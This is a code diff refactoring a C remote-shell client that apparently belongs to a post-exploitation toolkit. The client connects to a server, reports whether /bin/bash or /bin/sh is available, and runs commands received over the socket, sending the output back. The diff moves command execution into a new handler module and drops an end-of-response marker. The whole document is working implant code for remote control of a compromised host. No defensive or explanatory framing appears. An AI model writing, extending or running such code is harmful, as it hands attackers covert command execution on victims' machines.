@@ -6,6 +6,7 @@
 #include "crypto.h"
 #include "postexp.h"
 #include <unistd.h>
+#include "command_handler.h" // Include the new command handler module
 
 #define DEFAULT_PORT 8080
 #define DEFAULT_IP "127.0.0.1"
@@ -16,12 +17,6 @@ void send_shell_type(int sockfd, const char *shell) {
         perror("Error sending shell type to server");
     } else {
         printf("Sent shell type: %s\n", shell);
-    }
-}
-
-void send_end_of_response(int sockfd) {
-    if (send(sockfd, "[END_OF_RESPONSE]\n", 18, 0) < 0) {
-        perror("Error sending end-of-response marker to server");
     }
 }
 
@@ -191,30 +186,26 @@ int main(int argc, char *argv[]) {
     const char *shell = access("/bin/bash", X_OK) == 0 ? "/bin/bash" : "/bin/sh";
     send_shell_type(sockfd, shell);
 
-    char command_buffer[BUFFER_SIZE];
-    while (1) {
-        ssize_t bytes_received = recv(sockfd, command_buffer, BUFFER_SIZE - 1, 0);
-        if (bytes_received <= 0) {
-            perror("Error receiving command or connection closed by server");
-            break;
-        }
-
-        command_buffer[bytes_received] = '\0';
-
-        if (strcmp(command_buffer, "exit") == 0) {
-            printf("Exiting on server request...\n");
-            break;
-        }
-
-        char sanitized_command[BUFFER_SIZE];
-        snprintf(sanitized_command, BUFFER_SIZE, "%s -c \"%s\" 2>&1", shell, command_buffer);
-
-        execute_command_and_send_output(sanitized_command, sockfd);
-
-        send_end_of_response(sockfd);
+char command_buffer[BUFFER_SIZE];
+while (1) {
+    ssize_t bytes_received = recv(sockfd, command_buffer, BUFFER_SIZE - 1, 0);
+    if (bytes_received <= 0) {
+        perror("Error receiving command or connection closed by server");
+        break;
     }
 
-    close(sockfd);
-    printf("Disconnected from server.\n");
-    return 0;
+    command_buffer[bytes_received] = '\0';
+
+    if (strcmp(command_buffer, "exit") == 0) {
+        printf("Exiting on server request...\n");
+        break;
+    }
+
+    // Use the command handler to execute and send the response
+    execute_and_send_command(sockfd, command_buffer, shell);
+}
+
+close(sockfd);
+printf("Disconnected from server.\n");
+return 0;
 }
